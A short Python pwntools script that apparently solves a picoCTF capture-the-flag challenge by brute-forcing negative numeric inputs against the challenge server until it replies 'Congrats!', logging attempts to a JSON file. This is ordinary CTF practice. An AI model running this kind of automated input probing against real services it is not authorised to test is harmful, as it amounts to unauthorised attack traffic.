from pwn import *
from ctypes import *
import re
import json
import sys

tasks = 4096

checked = {}
def check(i):
	if str(i) in checked:
		return checked[str(i)]
	p = remote("jupiter.challenges.picoctf.org", 28953)
	p.recvline()
	p.recvline()
	p.recvline()
	p.sendline("-" + str(i))
	resp = p.recvline().decode()
	p.close()
	checked[i] = (i, re.search("Congrats!", resp ) != None)
	return (i, re.search("Congrats!", resp ) != None)

try:
	for i in range(tasks):
		if i % 32 == 0:
			print("trying num = ", i)
		c = check(i)
		if c[1] == True:
			print("found!", c)
			open("checked.json","w").write(json.dumps(checked))
			sys.exit()
except (KeyboardInterrupt, SystemExit):
	open("checked.json","w").write(json.dumps(checked))
open("checked.json","w").write(json.dumps(checked))
